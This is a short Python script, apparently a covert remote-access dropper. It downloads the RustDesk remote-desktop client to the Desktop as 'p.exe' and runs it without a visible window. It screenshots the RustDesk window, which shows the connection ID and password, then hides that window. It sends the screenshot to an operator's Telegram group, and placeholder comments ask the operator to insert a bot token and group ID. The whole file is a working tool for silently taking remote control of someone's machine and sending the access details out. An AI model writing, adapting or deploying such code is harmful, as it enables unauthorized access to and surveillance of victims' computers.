import time
import os
import requests
import telegram
import asyncio
import pyautogui
import subprocess
import pygetwindow as gw

url1 = 'https://github.com/rustdesk/rustdesk/releases/download/1.3.2/rustdesk-1.3.2-x86_64.exe'
base_path = os.path.expanduser("~")
path = f'{base_path}\\Desktop\\p.exe'

bot = telegram.Bot(token='TOKEN') #INSERT YOUR TELEGRAM BOT TOKEN
chat_id = 'GROUP_ID' #INSERT YOUR GROUP ID FOR RECIEVE THE PRINT OF RUSTDESK WINDOW


rustdesk = path

window_name = "RustDesk"


response = requests.get(url1)
with open (path,'wb') as file:
    file.write(response.content)

processo = processo = subprocess.Popen(
    [rustdesk],
    creationflags=subprocess.CREATE_NO_WINDOW
)


time.sleep(1)
janela = gw.getWindowsWithTitle(window_name)[0]
if janela:

    janela.restore()
    time.sleep(0.3)
    screenshot = pyautogui.screenshot()
    screenshot.save(f'{base_path}\\Desktop\\test.png')
janela.hide()

async def main():

    await bot.send_photo(chat_id=chat_id, photo=open(f'{base_path}\Desktop\\test.png', 'rb'), caption='Success')

if __name__ == '__main__':
    asyncio.run(main())
